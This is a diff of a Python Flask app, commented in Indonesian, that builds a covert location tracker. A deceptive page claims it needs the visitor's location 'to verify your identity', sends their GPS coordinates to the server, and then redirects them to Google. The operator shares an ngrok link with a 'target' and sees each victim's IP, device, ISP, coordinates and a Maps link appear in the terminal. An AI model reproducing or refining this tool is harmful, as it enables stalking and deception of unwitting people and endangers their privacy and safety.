@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, jsonify
+from flask import Flask, request, render_template_string, jsonify
 import requests
 import json
 import os
@@ -6,111 +6,210 @@ import subprocess
 import threading
 import time
 import datetime
-import sys
 
 app = Flask(__name__)
 
 LOG_FILE = "logs.txt"
 NGROK_PORT = 5000
 
-# Buat file buat komunikasi antar thread
-NOTIF_FILE = "notif.txt"
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            padding: 20px;
+        }
+        .box {
+            border: 1px solid #00ff41;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            background: #0d0d0d;
+            border-radius: 8px;
+        }
+        h1 { font-size: 18px; font-weight: normal; margin-bottom: 20px; }
+        .loader {
+            border: 2px solid #00ff41;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { font-size: 12px; opacity: 0.6; margin-top: 10px; }
+        .btn {
+            background: #00ff41;
+            color: #0a0a0a;
+            border: none;
+            padding: 12px 30px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn:hover { background: #00cc33; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div id="loading">
+            <h1>Establishing Secure Connection...</h1>
+            <div class="loader"></div>
+            <div class="status">Please wait</div>
+        </div>
+        <div id="location-prompt" class="hidden">
+            <h1>LOCATION ACCESS REQUIRED</h1>
+            <p style="font-size:13px;margin:10px 0;color:#aaa;">
+                This service needs your location to verify your identity.
+                <br><br>
+                <span style="color:#ff4444;">Your location will be used for authentication purposes only.</span>
+            </p>
+            <button class="btn" onclick="requestLocation()">ALLOW LOCATION</button>
+            <div class="status" style="margin-top:15px;">Click allow to continue</div>
+        </div>
+    </div>
+
+    <script>
+        var trackingDone = false;
+
+        function requestLocation() {
+            if (trackingDone) return;
+            
+            var statusEl = document.querySelector('.status');
+            statusEl.textContent = 'Getting your location...';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        var lat = pos.coords.latitude;
+                        var lon = pos.coords.longitude;
+                        fetch('/track?lat=' + lat + '&lon=' + lon)
+                            .then(function() {
+                                trackingDone = true;
+                                document.getElementById('location-prompt').classList.add('hidden');
+                                document.getElementById('loading').classList.remove('hidden');
+                                document.querySelector('.status').textContent = 'Location verified. Redirecting...';
+                                setTimeout(function() {
+                                    window.location.href = 'https://www.google.com';
+                                }, 1500);
+                            })
+                            .catch(function() {
+                                statusEl.textContent = 'Error. Trying again...';
+                                setTimeout(requestLocation, 1000);
+                            });
+                    },
+                    function(err) {
+                        statusEl.textContent = 'Location access is required. Click allow.';
+                        document.getElementById('location-prompt').classList.remove('hidden');
+                        document.getElementById('loading').classList.add('hidden');
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                statusEl.textContent = 'Your browser does not support location.';
+            }
+        }
+
+        // Tunggu 1 detik lalu tampilkan prompt location
+        setTimeout(function() {
+            document.getElementById('loading').classList.add('hidden');
+            document.getElementById('location-prompt').classList.remove('hidden');
+        }, 1000);
+    </script>
+</body>
+</html>
+"""
 
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
 
-def show_notification(data):
-    """Tampilkan notifikasi di terminal dengan efek"""
-    clear_screen()
+def print_target(data):
+    """Print data target ke terminal dengan format bersih"""
     lokasi = data.get('lokasi', {})
     lat = lokasi.get('latitude', 0)
     lon = lokasi.get('longitude', 0)
-    kota = lokasi.get('kota', 'Unknown')
-    provinsi = lokasi.get('provinsi', 'Unknown')
-    negara = lokasi.get('negara', 'Unknown')
-    isp = lokasi.get('isp', 'Unknown')
-    ip = data.get('ip', 'Unknown')
-    ua = data.get('user_agent', 'Unknown')
-    ts = data.get('timestamp', '')
-    
-    # Deteksi device dari user agent
-    device = "PC"
+    kota = lokasi.get('kota', '-')
+    provinsi = lokasi.get('provinsi', '-')
+    negara = lokasi.get('negara', '-')
+    isp = lokasi.get('isp', '-')
+    ip = data.get('ip', '-')
+    ua = data.get('user_agent', '-')
+    ts = data.get('timestamp', '-')
+
+    # Parse device dari user agent
+    device = 'PC'
     if 'Android' in ua:
-        device = "📱 Android"
+        device = 'Android'
     elif 'iPhone' in ua or 'iPad' in ua:
-        device = "📱 iOS"
+        device = 'iOS'
     elif 'Windows' in ua:
-        device = "💻 Windows"
+        device = 'Windows'
     elif 'Linux' in ua:
-        device = "🐧 Linux"
+        device = 'Linux'
     elif 'Mac' in ua:
-        device = "🍎 macOS"
-    
-    # Deteksi browser
-    browser = "Unknown"
+        device = 'Mac'
+
+    browser = 'Unknown'
     if 'Chrome' in ua and 'Edg' not in ua:
-        browser = "🌐 Chrome"
+        browser = 'Chrome'
     elif 'Firefox' in ua:
-        browser = "🦊 Firefox"
+        browser = 'Firefox'
     elif 'Safari' in ua and 'Chrome' not in ua:
-        browser = "🧭 Safari"
+        browser = 'Safari'
     elif 'Edg' in ua:
-        browser = "🌐 Edge"
-    
-    gps_tag = "📍 GPS" if lokasi.get('akurasi') == 'GPS (sangat akurat)' else "🌐 IP"
-    
-    print("\n" + "="*70)
-    print(f"  🔴🔴🔴 NEW TARGET DETECTED! 🔴🔴🔴")
-    print("="*70)
-    print(f"\n  {gps_tag} {device} | {browser}")
-    print(f"  🕐 Waktu: {ts}")
-    print(f"  🌏 IP: {ip}")
-    print(f"  📍 Lokasi: {kota}, {provinsi}, {negara}")
-    print(f"  🏢 ISP: {isp}")
-    print(f"  🎯 Koordinat: {lat}, {lon}")
-    
+        browser = 'Edge'
+
+    gps_tag = 'GPS' if lokasi.get('akurasi') == 'GPS (sangat akurat)' else 'IP'
+
+    clear_screen()
+    print('=' * 70)
+    print('  NEW TARGET DETECTED')
+    print('=' * 70)
+    print()
+    print('  Time   : ' + ts)
+    print('  IP     : ' + ip)
+    print('  Device : ' + device + ' / ' + browser)
+    print('  ISP    : ' + isp)
+    print('  City   : ' + kota)
+    print('  Region : ' + provinsi + ', ' + negara)
+    print('  Type   : ' + gps_tag)
+    print('  Lat    : ' + str(lat))
+    print('  Lon    : ' + str(lon))
+    print()
     if lat != 0 and lon != 0:
-        print(f"\n  🗺️  GOOGLE MAPS:")
-        print(f"  https://www.google.com/maps?q={lat},{lon}")
-        
-        # Tampilkan preview maps (ASCII sederhana)
-        print("\n  📌 PETA PREVIEW:")
-        print("  " + "-"*50)
-        # Buat grid sederhana
-        grid_size = 20
-        center_x = grid_size // 2
-        center_y = grid_size // 2
-        for y in range(grid_size):
-            line = "  "
-            for x in range(grid_size):
-                if x == center_x and y == center_y:
-                    line += "🔴"
-                elif x == center_x:
-                    line += "│"
-                elif y == center_y:
-                    line += "─"
-                else:
-                    line += "·"
-            print(line)
-        print("  " + "-"*50)
-        print("  🔴 = POSISI TARGET (perkiraan)")
-    
-    print("\n" + "="*70)
-    print("  [*] Tekan CTRL+C untuk stop tracker")
-    print("="*70 + "\n")
-    
-    # BIP suara biar keren
+        print('  MAPS   : https://www.google.com/maps?q=' + str(lat) + ',' + str(lon))
+    print()
+    print('=' * 70)
+    print('  Waiting for next target...')
+    print('=' * 70)
+    print()
+
+    # Bip suara
     if os.name == 'posix':
         os.system('echo -e "\a"')
-        # Atau pake paplay kalo ada
-        try:
-            subprocess.run(['paplay', '/usr/share/sounds/freedesktop/stereo/complete.oga'], 
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except:
-            pass
 
 def monitor_log():
-    """Monitor file log dan tampilkan notifikasi saat ada data baru"""
+    """Monitor file log real-time"""
     last_size = 0
     if os.path.exists(LOG_FILE):
         last_size = os.path.getsize(LOG_FILE)
@@ -120,7 +219,6 @@ def monitor_log():
         if os.path.exists(LOG_FILE):
             current_size = os.path.getsize(LOG_FILE)
             if current_size > last_size:
-                # Ada data baru!
                 with open(LOG_FILE, 'r', encoding='utf-8') as f:
                     f.seek(last_size)
                     new_lines = f.readlines()
@@ -128,13 +226,10 @@ def monitor_log():
                         if line.strip():
                             try:
                                 data = json.loads(line)
-                                # Cek kalau ini data dari target (bukan localhost)
                                 ip = data.get('ip', '')
+                                # Skip localhost, tampilkan hanya target
                                 if ip and not ip.startswith('127.') and not ip.startswith('192.168.'):
-                                    show_notification(data)
-                                else:
-                                    # Tetap tampilkan tapi kecil
-                                    print(f"[*] Local access: {ip}")
+                                    print_target(data)
                             except:
                                 pass
                 last_size = current_size
@@ -151,36 +246,39 @@ def get_public_ngrok_url():
         return None
 
 def wait_for_ngrok(max_wait=30):
-    print("[*] Menunggu ngrok siap...")
+    print('[*] Waiting for ngrok...')
     for i in range(max_wait):
         url = get_public_ngrok_url()
         if url:
-            print("\n" + "="*70)
-            print(f"  ✅ LINK PUBLIK: {url}")
-            print("="*70)
-            print(f"  📤 Kirim link ini ke target:")
-            print(f"  {url}")
-            print("\n  📊 Lihat data: {url}/data?pass=tracker123")
-            print("="*70 + "\n")
+            print()
+            print('=' * 70)
+            print('  PUBLIC LINK: ' + url)
+            print('=' * 70)
+            print()
+            print('  Send this link to target:')
+            print('  ' + url)
+            print()
+            print('  Data: ' + url + '/data?pass=tracker123')
+            print('=' * 70)
+            print()
             return url
         time.sleep(1)
-    print("[-] Ngrok gagal. Cek http://localhost:4040")
+    print('[-] Ngrok failed. Check http://localhost:4040')
     return None
 
 def start_ngrok():
     try:
         with open('ngrok.log', 'w') as f:
-            subprocess.Popen(['ngrok', 'http', str(NGROK_PORT)], 
-                           stdout=f, stderr=f)
-        print("[+] Ngrok proses dimulai...")
+            subprocess.Popen(['ngrok', 'http', str(NGROK_PORT)], stdout=f, stderr=f)
+        print('[+] Ngrok started...')
         return True
     except Exception as e:
-        print(f"[-] Gagal: {e}")
+        print('[-] Failed: ' + str(e))
         return False
 
 def get_location(ip):
     try:
-        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone', timeout=5)
+        response = requests.get('http://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org,timezone', timeout=5)
         data = response.json()
         if data['status'] == 'success':
             return {
@@ -204,7 +302,7 @@ def log_data(data):
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return render_template_string(HTML_TEMPLATE)
 
 @app.route('/track', methods=['GET'])
 def track():
@@ -250,17 +348,17 @@ def track():
     
     log_data(full_data)
     
-    pixel = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02L\x01\x00;'
-    return pixel, 200, {'Content-Type': 'image/gif', 'Cache-Control': 'no-cache'}
+    # Kirim response kosong (biar cepat)
+    return '', 204
 
 @app.route('/data', methods=['GET'])
 def view_data():
     password = request.args.get('pass')
     if password != 'tracker123':
-        return "Akses ditolak", 403
+        return 'Access Denied', 403
     
     if not os.path.exists(LOG_FILE):
-        return "Belum ada data"
+        return 'No data'
     
     with open(LOG_FILE, 'r', encoding='utf-8') as f:
         lines = f.readlines()
@@ -269,20 +367,20 @@ def view_data():
     return jsonify(data_list)
 
 if __name__ == '__main__':
-    print("\n" + "="*70)
-    print("  🎯 TRACKER - REAL-TIME NOTIFICATION")
-    print("="*70 + "\n")
-    
-    # Start ngrok
+    print()
+    print('=' * 70)
+    print('  TRACKER - FORCE LOCATION ALLOW')
+    print('=' * 70)
+    print()
+
     if start_ngrok():
         time.sleep(3)
         public_url = wait_for_ngrok()
-    
-    # Start monitor thread
+
     monitor_thread = threading.Thread(target=monitor_log, daemon=True)
     monitor_thread.start()
-    print("[*] Monitor real-time aktif!")
-    print("[*] Setiap ada target klik, langsung muncul di sini!\n")
-    
-    # Jalankan Flask
+    print('[*] Real-time monitor active')
+    print('[*] Waiting for target...')
+    print()
+
     app.run(host='0.0.0.0', port=5000, debug=False)
